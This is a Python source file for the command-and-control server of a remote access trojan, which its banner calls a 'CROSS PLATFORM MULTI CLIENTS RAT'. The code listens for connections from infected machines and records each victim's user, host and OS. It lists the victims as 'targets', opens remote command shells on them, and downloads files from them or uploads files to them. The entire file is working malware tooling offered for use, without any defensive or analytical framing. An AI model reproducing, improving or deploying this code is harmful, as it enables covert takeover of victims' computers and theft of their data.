import socket
import json
import threading
import platform
import os
import time

# --- Pystyle Integration ---
print("[*] Checking Requirements Module.....")
try:
    from pystyle import *
except ImportError:
    cmd = "python -m pip install pystyle -q" if platform.system() == "Windows" else "python3 -m pip install pystyle -q"
    os.system(cmd)
    from pystyle import *

banner = Center.XCenter(r"""
*************************************************************************************************
* :::    ::: :::::::::: :::        ::::::::::: ::::::::  :::::::::      ::: :::::::::::     *
* :+:    :+: :+:        :+:            :+:    :+:    :+: :+:    :+:   :+: :+:   :+:         *
* +:+    +:+ +:+        +:+            +:+    +:+    +:+ +:+    +:+  +:+   +:+  +:+         *
* +#++:++#++ +#++:++#   +#+            +#+    +#+    +:+ +#++:++#:  +#++:++#++: +#+         *
* +#+    +#+ +#+        +#+            +#+    +#+    +#+ +#+    +#+ +#+     +#+ +#+         *
* #+#    #+# #+#        #+#            #+#    #+#    #+# #+#    #+# #+#     #+# #+#         *
* ###    ### ########## ########## ########### ########  ###    ### ###     ### ###         *
* CROSS PLATFORM MULTI CLIENTS RAT                            *
* Coded By: Machine1337, Forked by Neos Helios                      *
*************************************************************************************************
""")

def clear_screen():
    os.system("cls||clear")

# --- Configuration & Globals ---
BIND_IP = "0.0.0.0"
BIND_PORT = 8080    # Matches your client's port-hopping list
BUFFER_SIZE = 8192

clients = []        # List of socket objects
ips = []            # List of (ip, port) tuples
client_metadata = {} # IP -> Dictionary of host/user info
stop_threads = False

# --- Core Networking ---
def send_data(target, data):
    try:
        jsondata = json.dumps(data)
        target.send(jsondata.encode('utf-8'))
    except:
        pass

def recv_data(target):
    data = ''
    while True:
        try:
            chunk = target.recv(BUFFER_SIZE).decode('utf-8')
            if not chunk: return None
            data += chunk
            return json.loads(data)
        except ValueError:
            continue
        except:
            return None

# --- File Transfer Logic ---
def download_file(target, file_name):
    """ Server receives file from Client """
    try:
        print(Colors.yellow + f"[*] Downloading {file_name}...")
        with open(file_name, 'wb') as f:
            target.settimeout(3.0)
            while True:
                try:
                    chunk = target.recv(BUFFER_SIZE)
                    if not chunk: break
                    f.write(chunk)
                except socket.timeout:
                    break
        target.settimeout(None)
        print(Colors.green + f"[+] File saved: {os.path.abspath(file_name)}")
    except Exception as e:
        print(Colors.red + f"[-] Download Error: {e}")

def upload_file(target, file_name):
    """ Server sends file to Client """
    if not os.path.exists(file_name):
        print(Colors.red + "[-] Error: Local file not found.")
        return
    try:
        print(Colors.yellow + f"[*] Uploading {file_name}...")
        with open(file_name, 'rb') as f:
            while True:
                chunk = f.read(BUFFER_SIZE)
                if not chunk: break
                target.send(chunk)
        time.sleep(0.5) # Allow buffer to clear
        print(Colors.green + "[+] Upload Complete.")
    except Exception as e:
        print(Colors.red + f"[-] Upload Error: {e}")

# --- Shell Menu ---
def shell(target, ip):
    while True:
        command = input(Colors.yellow + f"\n[*] Shell@{ip}# ").strip()
        if not command: continue
        
        send_data(target, command)

        if command == 'q':
            break
        
        if command == 'help':
            print(Colorate.Vertical(Colors.red_to_purple, """
    **** SHELL COMMANDS ****
    1. download <file> | Pull file from target
    2. upload <file>   | Push file to target
    3. cd <dir>        | Change directory
    4. kill            | Close connection
    5. q               | Back to Main Menu
            """, 2))
            
        elif command == 'kill':
            target.close()
            idx = clients.index(target)
            clients.pop(idx)
            ips.pop(idx)
            print(Colors.red + "[!] Connection terminated.")
            break
            
        elif command.startswith("download "):
            download_file(target, command[9:].strip())
            
        elif command.startswith("upload "):
            upload_file(target, command[7:].strip())
            
        else:
            response = recv_data(target)
            if response:
                print(Colors.white + str(response))
            else:
                print(Colors.red + "[-] Lost connection to client.")
                break

# --- Background Listener ---
def server_listener(s):
    global stop_threads
    while not stop_threads:
        try:
            s.settimeout(1.0)
            target, ip = s.accept()
            
            # Receive initial metadata handshake
            meta = recv_data(target)
            if meta:
                clients.append(target)
                ips.append(ip)
                client_metadata[ip[0]] = meta
                
                print(Colors.green + f"\n[+] {meta.get('User')}@{meta.get('Host')} ({ip[0]}) connected!")
                print(Colors.green_to_yellow + "[*] Main Menu (Type 'help'): ", end="")
        except socket.timeout:
            continue
        except:
            pass

# --- Main Logic ---
if __name__ == '__main__':
    clear_screen()
    print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        s.bind((BIND_IP, BIND_PORT))
        s.listen(10)
        print(Colors.cyan + f"[*] Listening on {BIND_IP}:{BIND_PORT}...")
        
        # Start background thread
        t1 = threading.Thread(target=server_listener, args=(s,), daemon=True)
        t1.start()
        
        while True:
            cmd = input(Colorate.Vertical(Colors.green_to_yellow, "\n[*] Main Menu# ", 2)).strip()
            
            if cmd == "help":
                print(Colorate.Vertical(Colors.red_to_purple, """
    **** MAIN MENU ****
    1. targets   | Show connected clients
    2. session X | Interact with client ID (e.g., session 0)
    3. exit      | Close server
                """, 2))
            
            elif cmd == "targets":
                print("\n" + "="*80)
                print(f"{'ID':<4} | {'IP ADDRESS':<15} | {'USER':<15} | {'HOST':<15} | {'OS':<10}")
                print("-" * 80)
                for i, ip_addr in enumerate(ips):
                    m = client_metadata.get(ip_addr[0], {})
                    print(f"{i:<4} | {ip_addr[0]:<15} | {m.get('User', '???'):<15} | {m.get('Host', '???'):<15} | {m.get('OS', '???'):<10}")
                print("="*80)
                
            elif cmd.startswith("session "):
                try:
                    num = int(cmd[8:])
                    shell(clients[num], ips[num][0])
                except:
                    print(Colors.red + "[-] Invalid session ID.")
                    
            elif cmd == "exit":
                stop_threads = True
                print(Colors.red + "[*] Shutting down...")
                break
                
    except Exception as e:
        print(Colors.red + f"[-] Critical Error: {e}")
    finally:
        for c in clients: c.close()
        s.close()
